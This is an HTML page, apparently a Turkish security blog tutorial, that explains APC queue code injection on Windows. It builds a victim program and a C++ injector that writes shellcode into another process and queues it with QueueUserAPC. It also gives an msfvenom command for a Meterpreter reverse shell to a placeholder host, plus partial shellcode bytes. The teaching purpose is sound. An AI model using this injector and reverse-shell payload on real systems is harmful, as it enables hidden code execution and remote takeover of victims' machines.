@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>APC Queue Code Injection</title>
+  <meta name="description" content="Introduction to APC, Thread and APC Code Injection">
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:4000/2019/08/27/APC-Queue-Code-Injection.html">
+  <link rel="alternate" type="application/rss+xml" title="Daily Security" href="/feed.xml">
+  
+  
+</head>
+
+
+  <body>
+
+    <header class="site-header" role="banner">
+
+  <div class="wrapper">
+    
+    
+    <a class="site-title" href="/">Daily Security</a>
+  
+    
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+              <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+              <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger">
+          
+            
+            
+          
+            
+            
+            <a class="page-link" href="/about/">About</a>
+            
+          
+            
+            
+          
+            
+            
+          
+            
+            
+          
+        </div>
+      </nav>
+    
+  </div>
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">APC Queue Code Injection</h1>
+    <p class="post-meta">
+      <time datetime="2019-08-27T00:00:00+03:00" itemprop="datePublished">
+        
+        Aug 27, 2019
+      </time>
+      </p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h1 id="introduction-to-apc-thread-and-apc-code-injection">Introduction to APC, Thread and APC Code Injection</h1>
+
+<p>Bu yazımda  bir <strong>APC (Asynchronous Procedure Call)</strong>‘nin ne olduğundan bahsedeceğim. İnternet’te türkçe olarak böyle bir <strong>Code Injection</strong> tekniğinin açıklaması ve örnekleri yapıldımı diye baktığımda hiç bir kaynak bulamadım. Bu yüzdende ben yazmaya karar verdim.</p>
+
+<p>Yazının ileriki kısımlarında <strong>Code Injection</strong> gerçekleştirmek için gerekli olan yazılımı <strong>step-by-step</strong> yani adım adım geliştireceğiz. İlk başlarda sıkıcı-anlaşılmaz gelebilir yalnız tüm anlatım birbiri ile bağlı. Kısaca <strong>giriş-gelişme</strong> sıkabilir bu yüzden <strong>sonuç</strong>‘u bekleyelim.</p>
+
+<p>Yazı hakkında kısa bir özet geçmek gerekirse :</p>
+
+<ul>
+  <li><strong>APC</strong> bir fonksiyondur</li>
+  <li><strong>Eşzamansız</strong> yani <strong>Asynchronously</strong> çalışan bir fonksiyondur.</li>
+  <li>Bu fonksiyon <strong>Thread</strong>‘lerin içeriğinde çalışmaktadır.</li>
+  <li>Biz bu tekniği kullanarak <strong>Process</strong>‘ler içerisine <strong>Kod</strong> enjekte edebiliyoruz.</li>
+</ul>
+
+<p>Bahsettiğim <strong>Code Injection</strong> tekniğinin daha önce birçok <strong>Zararlı Yazılım</strong> tarafından kullanıldığını gördük. Örneğin :</p>
+
+<ul>
+  <li><strong>Carberp</strong></li>
+  <li><strong>DorkBot</strong></li>
+  <li>Aynı zamanda da <a href="https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html">APT33</a> tarafından geliştirilen <strong>TurnedUp</strong>.</li>
+</ul>
+
+<p>Bu <strong>zararlı yazılım</strong>‘lar içerisinde <strong>APC Queue Code Injection</strong> tekniği mevcut.</p>
+
+<p>Yani kısaca anlatmak istediğim popüler bir teknik olduğundan aynı zamanda da bazı <strong>Anti-malware</strong> ve <strong>EDR (Endpoint Detection and Response)</strong> yazılımları tarafından farkedildiğinden, bir <strong>Saldırı</strong> tekniği olarak sıkça kullanılmasını tavsiye etmiyorum.</p>
+
+<h3 id="apc-nedir-">APC Nedir ?</h3>
+
+<p>Yukarıda basit bir özetini geçtim ama yine de teknik açıdan anlatmakta fayda var.</p>
+
+<p><strong>Asynchronous Procedure Call (APC)</strong>, <strong>Eşzamansız (Asynchronously)</strong> olarak çalışan, aynı zamanda da <strong>Thread</strong> içeriğinde çalışmakta olan bir fonksiyondur.</p>
+
+<p>Bir <strong>APC</strong>, <strong>Thread</strong> içerisine sunulduğu zaman sistem <strong>Software Interrupt</strong> adında bir hata alır. Dolayısı ile <strong>Thread</strong> tekrar yüklendiğinde ya da çalıştığında o <strong>Thread</strong> bizim <strong>APC</strong> fonksiyonumuzu çalıştırır.</p>
+
+<ul>
+  <li>
+    <p><strong>System</strong> tarafından oluşturulan bir <strong>APC</strong>‘ye <strong>kernel-mode APC</strong> denilir.</p>
+  </li>
+  <li>
+    <p><strong>Application</strong> tarafından oluşturulan bir <strong>APC</strong>‘ye ise <strong>user-mode APC</strong> denilmektedir.</p>
+  </li>
+</ul>
+
+<p>Bir <strong>user-mode APC</strong>‘nin <strong>Thread</strong> içerisinde çalışması için <strong>Thread</strong>‘in bir <strong>Alertable State</strong> içerisinde olması lazımdır çünkü <strong>alertable I/O</strong> dediğimiz olay <strong>asynchronous I/O request</strong>‘lerini <strong>process</strong> eder.</p>
+
+<p>Dolayısı ile bir <strong>Thread</strong> eğer <strong>Alertable State</strong> içerisinde olmazsa bir <strong>asynchronous I/O</strong> requesti olan <strong>APC</strong> fonksiyonunu <strong>çalıştıramaz</strong> yani <strong>process</strong> edemez.</p>
+
+<p><strong>Alertable I/O</strong> ve <strong>APC</strong>‘nin gerekli ilişkisini  <strong>Windows</strong> tarafından yazılan bu dökümanda daha detaylı öğrenebilirsiniz : <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/alertable-i-o">Alertable I/O</a></p>
+
+<p>Aklı biraz açıkgözlülüğe çalışanın aklına hemen şu soru gelecektir :</p>
+
+<ul>
+  <li><strong>Yani biz eğer process’in içerisinde bulunan thread’e bir APC fonksiyonu gönderirsek ve bu APC fonksiyonu bizim shellcode’umuzu içerirse bu bir APC Queue Code Injection sayılır değil mi ?</strong></li>
+</ul>
+
+<p>Vereceğim bu cevap ile blog yazısının tüm sihrini kaçıracağım ama yinede okuyanlar için heycanlandırıcı bir yazı olmasını istediğimden bu sorunun cevabıda <strong>Evet</strong>.</p>
+
+<h3 id="apc-queue-code-injection">APC Queue Code Injection</h3>
+
+<p>Yazdığımız kodu tek tek anlatmaya başlamadan önce <strong>APC</strong>, <strong>Thread</strong>, <strong>Queue</strong> gibi terimleri daha iyi anlaşılması adına tekrar anlatalım.</p>
+
+<ul>
+  <li>**APC (Asynchronous Procedure Call) **  : Asenkron (Eşzamansız) olarak çalışan bir fonksiyondur.</li>
+  <li><strong>Thread</strong> : Bir <strong>Process</strong> yani çalışan bir program içerisinde birden fazla işlemi aynı zamanda gerçekleştirmek istersek oluşturacağımız <strong>Birim</strong> yani <strong>Unit</strong>‘tir.</li>
+  <li><strong>APC Queue to Thread</strong> : <strong>Thread</strong> içerisine çalıştırılacak olan fonksiyonu sunmaktır.</li>
+</ul>
+
+<p>Daha da basiti eğer biz bir <strong>Thread</strong> içerisine oluşturduğumuz <strong>APC</strong> fonksiyonunu (bu bir shellcode’da olabilir) eklediğimizde <strong>Thread</strong> hata verip sonraki çalışma esnasında bizim fonksiyonumuzu çalıştıracağından <strong>process</strong> içerisinde oluşturulan <strong>birim</strong>‘leri kontrol edebileceğizdir.</p>
+
+<p>Bu yukarıda anlattığımı kavrayamayan olduysa hiç sorun değil aşağıdaki resim tam olarak <strong>APC Queue Code Injection</strong> tekniğinin nasıl çalıştığını çok basit gözler önüne seriyor.</p>
+
+<p><img src="https://i.hizliresim.com/3OgLzp.jpg" alt="" /></p>
+
+<p>Resimi biraz daha adım adım açmak gerekir ise :</p>
+
+<ul>
+  <li>Bir <strong>Process</strong> oluşturuluyor.</li>
+  <li><strong>Process</strong> içerisinde alan(memory) ayrılıyor.</li>
+  <li>Bu alana <strong>Zararlı Kod</strong> enjekte ediliyor.</li>
+  <li>Enjekte edilen bu <strong>Zararlı Kod</strong> bir <strong>APC</strong> fonksiyonunun başlangıç adresine veriliyor.</li>
+  <li>Ve bu şekilde <strong>APC</strong> fonksiyonu <strong>Zararlı Kod</strong>‘u çalıştırıyor.</li>
+</ul>
+
+<p>Şimdi bir <strong>Saldırgan</strong> ve <strong>Kurban</strong> yazılımı oluşturacağız. Ve bu sayede <strong>Kurban</strong>‘ın çalıştırdığı <strong>APC</strong> fonksiyonuna bizim <strong>Shellcode</strong>‘umuzu enjekte edeceğiz.</p>
+
+<p>Öncelikle <strong>Kurban</strong> kodunu geliştirelim ve içeriğini biraz daha açıklayalım.</p>
+
+<h3 id="victim-code">Victim Code</h3>
+
+<p>Öncelikle kütüphanelerimizi ekleyelim :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+</code></pre></div></div>
+
+<p><strong>Main</strong> fonksiyonunu oluşturalım ve içerisinde bir adet <strong>APC</strong> fonksiyonunu çalıştıralım.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int main()
+{
+    std::cout &lt;&lt; "Entering alertable state...\n";
+		SleepEx(1000 * 60, true);
+}
+</code></pre></div></div>
+
+<p>Basit bir şekilde kodumuz bu. Şimdi birazdan <strong>Saldırgan</strong> kodunu geliştirmeye başladığımızda bu kısmı daha iyi anlayacağız.</p>
+
+<p>Buradaki <strong>SleepEx</strong> fonksiyonu bir <strong>APC</strong> fonksiyonudur.</p>
+
+<p><strong>Windows</strong> tarafından oluşturulan bu <strong>APC</strong> dökümanında hangi fonksiyonlar mevcut bakarsanız <strong>SleepEx</strong>‘i görebilirsiniz tabi onun dışında bir çok <strong>APC</strong> fonksiyonu mevcut :</p>
+
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">Asynchronous Procedure Calls</a></p>
+
+<p>Birazdan yapacağımız şey basitçe <strong>SleepEx</strong> fonksiyonunun başlangıç adresine bizim oluşturacağımız <strong>Shellcode</strong>‘u ekleyeceğiz. Dolayısıyla bu <strong>Kurban</strong> yazılım çalıştığında bizim <strong>Zararlı Kod</strong>‘umuzu çalıştıracak.</p>
+
+<h3 id="attacker-code">Attacker Code</h3>
+
+<p><strong>Saldırgan</strong> kodunu geliştirmeye başlamadan önce alttaki parametreler aracığılıyla <strong>MSFVenom</strong> kullanarak bir <strong>Shellcode</strong> oluşturduğunuzu varsayıyorum.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx EXITFUNC=thread -f c
+</code></pre></div></div>
+
+<p>Öncelikle kütüphanelerimizi ekleyelim :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;iostream&gt;
+#include &lt;stdio.h&gt;
+#include &lt;Windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+#include &lt;vector&gt;
+</code></pre></div></div>
+
+<p><strong>Main</strong> fonksiyonunu oluşturalım :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int main()
+{
+}
+</code></pre></div></div>
+
+<p><strong>Saldırgan</strong>‘ın kodu biraz uzun olduğundan adım adım ilerleyeceğiz. Kodu tamamen anlattıktan sonra <strong>Pastebin</strong> linkini vereceğim kendiniz derleyip çalıştırmak isterseniz diye.</p>
+
+<p>Şimdi <strong>Shellcode</strong>‘umuzu bir değişkene atayalım :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
+		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+		"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
+		"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b"
+		"\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41";
+</code></pre></div></div>
+
+<p><strong>APC</strong> içeren <strong>Zararlı Kod</strong>‘u enjekte edeceğimiz <strong>Process</strong>‘in <strong>Snapshot</strong>‘unu alacağımız değişkeni oluşturalım :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
+</code></pre></div></div>
+
+<p><strong>Kurban</strong> yazılımı içeren <strong>Process</strong>‘i tutacak değişkeni oluşturalım :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HANDLE victimProcess = NULL;
+</code></pre></div></div>
+
+<p>Hekleyeceğimiz <strong>Process</strong>‘in kayıtlarını tutacak olan <strong>processEntry</strong>‘i ve hekleyeceğimiz <strong>Thread</strong>‘in kayıtlarını tutacka olan <strong>threadEntry</strong>‘i oluşturalım :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
+THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
+</code></pre></div></div>
+
+<p>Hekleyeceğimiz <strong>Process</strong>‘in içerdiği <strong>Thread</strong>‘ların <strong>ID</strong>‘lerini tutacak değişkeni oluşturalım :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>std::vector&lt;DWORD&gt; threadIds;
+</code></pre></div></div>
+
+<p><strong>Shellcode</strong>‘un boyutunu tutacak değişkeni oluşturalım :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SIZE_T shellcodeSize = sizeof(shellcode);
+</code></pre></div></div>
+
+<p>Sonradan içini açacağımız <strong>Thread</strong>‘i bize tutacak olan <strong>threadHandle</strong> değişkenini oluşturalım :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HANDLE threadHandle = NULL;
+</code></pre></div></div>
+
+<p>Aşşağıdaki <strong>Kod</strong> basit bir şekilde şuanda bilgisayarınzda mevcut çalışan <strong>Process</strong>‘lerin dosya ismi ile bizim <strong>Kurban</strong> dosya ismini karşılaştırıp sonrada bulduğunda <strong>processEntry</strong>‘ye kaydediyor.</p>
+
+<p>Daha da basit şekilde <strong>Kurban</strong> yazılımı bulup bu yazılımın <strong>Process</strong> kayıtlarını <strong>processEntry</strong>‘ye ekliyor. Bu şekilde de <strong>yazılım</strong> üzerinde düzenleme ya da içerik görme gerçekleştirebileceğiz. Örneğin <strong>Kurban</strong> yazılımın <strong>Process ID</strong>‘sini görmek gibi vs….</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (Process32First(snapshot, &amp;processEntry)) {
+		while (_wcsicmp(processEntry.szExeFile, L"testtt1.exe") != 0) {
+			Process32Next(snapshot, &amp;processEntry);
+		}
+	}
+</code></pre></div></div>
+
+<p><strong>Kurban</strong> yazılımı <strong>PROCESS_ALL_ACCESS</strong> değeri ile tüm erişime sahip şekilde <strong>OpenProcess</strong> fonksiyonu aracığılıyla açıyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
+</code></pre></div></div>
+
+<p>Sonra <strong>Kurban</strong> yazılımın içine <strong>VirtualAllocEx</strong> fonksiyonu aracılığı ile enjekte edeceğimiz <strong>Shellcode</strong>‘un boyutu kadar alan ayırıyoruz.</p>
+
+<p>Ayırdığımız alanın <strong>Adresini</strong>‘de <strong>shellcodeAddr</strong> değişkenine atıyoruz :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LPVOID shellcodeAddr = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</code></pre></div></div>
+
+<p><strong>apcRoutine</strong> değişkeni içerisine <strong>Shellcode</strong> adresimizi atıyoruz.</p>
+
+<p>Bu kısımda kafanız karışmasın bu <strong>değişken</strong>‘in ileride ne yaptığını daha iyi anlayacağız :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellcodeAddr;
+</code></pre></div></div>
+
+<p><strong>VirtualAllocEx</strong> ile <strong>Kurban</strong> yazılımı içerisinde ayırdığımız alana <strong>WriteProcessMemory</strong> fonksiyonu ile bizim <strong>Shellcode</strong> yani <strong>Zararlı Kod</strong>‘umuzu yazıyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WriteProcessMemory(victimProcess, shellcodeAddr, shellcode, shellcodeSize, NULL);
+</code></pre></div></div>
+
+<p>Aşağıda ki <strong>if</strong> karşılaştırması ile <strong>threadEntry</strong>‘nin <strong>Process</strong> içerisinden aldığımız <strong>Snapshot</strong> ile uyumluluğunu sorguluyoruz.</p>
+
+<p>Ve sonraki <strong>do-while</strong> döngüsünde bizim <strong>threadEntry</strong> içerisindeki <strong>Process ID</strong>‘si ile <strong>processEntry</strong> içerisindeki <strong>Process ID</strong>‘nin aynı olup olmadığını karşılaştırıyoruz.</p>
+
+<p>Eğer aynı ise başta oluşturduğumuz <strong>threadIDs</strong> değişkenine <strong>Process</strong> içerisinde bulunan <strong>Thread</strong> yani çalışan <strong>Birimler</strong> tek tek ekleniyor.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (Thread32First(snapshot, &amp;threadEntry)) {
+		do {
+			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
+				threadIds.push_back(threadEntry.th32ThreadID);
+			}
+		} while (Thread32Next(snapshot, &amp;threadEntry));
+	}
+</code></pre></div></div>
+
+<p>Şimdi bu <strong>Saldırgan</strong> kodunun en önemli kısmına geldik.</p>
+
+<p>Aşşağıdaki kod basit bir şekilde şunları yapıyor :</p>
+
+<ul>
+  <li><strong>for</strong> döngüsü ile yukarıda anlattığımız <strong>do-while</strong> döngüsünden çıkan <strong>Thread ID</strong>‘leri alınıyor.</li>
+  <li><strong>printf</strong> ile bu <strong>Thread ID</strong>‘ler ekrana yazılıyor.</li>
+  <li>Her döngü çalıştığında mevcut olan <strong>Thread</strong> tüm yetkilerle yani <strong>THREAD_ALL_ACCESS</strong> ile <strong>OpenThread</strong> fonksiyonu kullanılarak <strong>threadHandle</strong> değişkenin içerisine aktarılıyor.</li>
+</ul>
+
+<p>En önemli bölüme geldik <strong>QueueUserAPC</strong>. Bu fonksiyon basit bir şekilde bizim başta içerisine <strong>Shellcode</strong> adresimizi aktardığımız <strong>apcRoutine</strong> değişkenini alıyor ilk parametre olarak.</p>
+
+<p>İkinci paramterle olarakta bir üstünde belirttiğimiz <strong>threadHandle</strong> değişkenini alıyor yani her döngüde yenilenen <strong>Kurban</strong> yazılım içerisinde bulunan <strong>Thread</strong>‘leri.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for (DWORD threadId : threadIds) {
+		printf("Thread : 0x%08x\n", threadId);
+		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
+		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
+		getchar();
+	}
+	
+return 0;
+</code></pre></div></div>
+
+<p>Bu fonksiyonun basitçe yaptığı şu <strong>Shellcode</strong> adresimizi bir <strong>APC</strong> fonksiyonu olarak görüyor ve bunu <strong>Kurban</strong> yazılım içerisinde çalışan <strong>Thread</strong>‘lerden birine atıyor.</p>
+
+<p>Dolayısı ile <strong>Thread</strong> bizim <strong>Shellcode</strong>‘umuzu çalıştırıyor.</p>
+
+<p>Tabi diyebilirsiniz ki <strong>Hangi thread’ı kullanması gerektiğini nereden biliyor ?</strong> diye. Çok güzel bir soru.</p>
+
+<p>Seçtiği <strong>Thread</strong>‘ın içeriği bir <strong>Alertable State</strong> içeren <strong>APC</strong> fonksiyonu olmak zorunda.</p>
+
+<p>Daha da basiti : <strong>SleepEx</strong>‘i içeren bir <strong>Thread</strong> ise <strong>Shellcode</strong> çalışıyor.</p>
+
+<p><strong>Döngü</strong>‘nün son kodu olarak eklediğim <strong>getchar</strong> bunu sağlıyor aslında.</p>
+
+<p>Yani eğer <strong>Shellcode</strong>‘u ekleyeceği doğru <strong>Thread</strong> değilse <strong>ENTER</strong> tuşuna basıp program içerisindeki başka bir <strong>Thread</strong>‘ı deneyebiliyoruz.</p>
+
+<p>Ama <strong>Kurban</strong> yazılım içerisinde sadece bir <strong>APC</strong> fonksiyonu kullandığımızdan oda <strong>SleepEx</strong> fonksiyonu olduğundan ilk <strong>Thread</strong>‘da direk <strong>Meterpreter</strong>‘den <strong>reverse_tcp</strong> yani erişimi alacağızdır.</p>
+
+<h3 id="proof-of-concept--poc-">Proof Of Concept ( PoC )</h3>
+
+<p><strong>Saldırgan</strong> ve <strong>Kurban</strong> yazılımlarının <strong>APC Queue Code Injection</strong> etkileşiminin gerçekleştiği bir video hazırladım bakmak isterseniz.</p>
+
+<p>Video : <a href="https://www.youtube.com/watch?v=KmrTowxl6Ho">APC Queue Code Injection PoC</a></p>
+
+<h1 id="the-end">THE END</h1>
+<p>Bu yazının sonuna da geldik.</p>
+
+<p><strong>Process Shellcode Injection</strong> tekniklerinden sadece bir tanesidir bu.</p>
+
+<p>Daha önce <strong>Process Shellcode Injection</strong> nedir hakkında bir yazı yayınladım eğer anlayamayan olduysa bu yazıyı.</p>
+
+<p>Bakmanızı öneririm : <a href="https://blacknbunny.github.io/2019/04/28/Process-Shellcode-Injection.html">Process Shellcode Injection</a></p>
+
+  </div>
+
+  
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Daily Security</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>
+            
+              Daily Security
+            
+            </li>
+            
+            <li><a href="mailto:xazamaxi@protonmail.com">xazamaxi@protonmail.com</a></li>
+            
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/blacknbunny"><span class="icon icon--github"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">blacknbunny</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/0DAYanc"><span class="icon icon--twitter"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">0DAYanc</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>In this blog we&#39;re going to solve CTF&#39;s &amp; Write Some Software&#39;s.My goal is redirect my little knowledge to other people.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
